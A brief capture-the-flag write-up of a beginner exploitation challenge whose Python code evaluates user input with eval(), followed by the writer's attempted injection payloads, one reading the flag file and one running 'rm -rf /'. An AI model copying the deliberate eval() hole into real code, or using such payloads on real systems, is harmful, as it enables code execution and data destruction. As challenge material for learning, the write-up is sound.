### Pwn 

#### My First Pwnie

```python
#!/usr/bin/env python3

# Pwn mostly builds on top of rev.
# While rev is more about understanding how a program works, pwn is more about figuring out how to exploit a program to reach the holy grail: Arbitrary Code Execution
#
# If you can execute arbitrary code on a system, that system might as well be yours...because you can do whatever you want with it! (this is the namesake of "pwn".....if you pwn a system, you own the system)
# Of course, that comes with the limitations of the environment you are executing code in...are you a restricted user, or a super admin?
# Sometimes you can make yourself a super admin starting from being a restricted user.....but we're not gonna do that right now.
#
# For now, I want you to figure out how to execute arbitrary commands on the server running the following code.
#
# To prove to me that you can excute whatever commands you want on the server, you'll need to get the contents of `/flag.txt`

try:
  response = eval(input("What's the password? "))
  print(f"You entered `{response}`")
  if response == "password":
    print("Yay! Correct! Congrats!")
    quit()
except:
  pass

print("Nay, that's not it.")

```
I tried different commands such as: 

```python
import('subprocess').getoutput('cat flag.txt')
import('os').system('rm -rf /')
```
Then finally connected to server using Netcat
